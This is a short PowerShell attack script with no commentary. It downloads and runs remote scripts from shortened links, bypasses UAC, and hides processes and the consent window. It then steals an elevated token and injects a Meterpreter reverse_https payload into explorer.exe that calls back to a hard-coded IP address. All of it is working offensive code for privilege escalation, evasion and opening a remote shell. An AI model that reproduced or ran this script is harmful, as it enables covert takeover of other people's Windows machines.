iwr https://goo.gl/x6ZcHM | iex;
iwr https://goo.gl/CB7F6k | iex;
iwr https://goo.gl/wxJHHq | iex;
iwr https://goo.gl/4QsWoj | iex;

workflow Test
{
    Parallel
    {
        Bypass-UAC -Method UacMethodNetOle32;
        
        sleep 2; kill-window consent;
        sleep 3; hide-process mmc;
        sleep 4; UAC-TokenMagic -BinPath C:\Windows\System32\cmd.exe -ProcPID (ps -Name mmc).id;
        sleep 1; $cmd="Invoke-Shellcode -ProcessId $((ps -Name explorer.exe).id) -Payload windows/meterpreter/reverse_https -Lhost  45.76.178.205 -Lport 443;"
        sleep 4; hide-process cmd; sleep 0.7; send-keys -Name $cmd -Cmd $cmd
    }
}
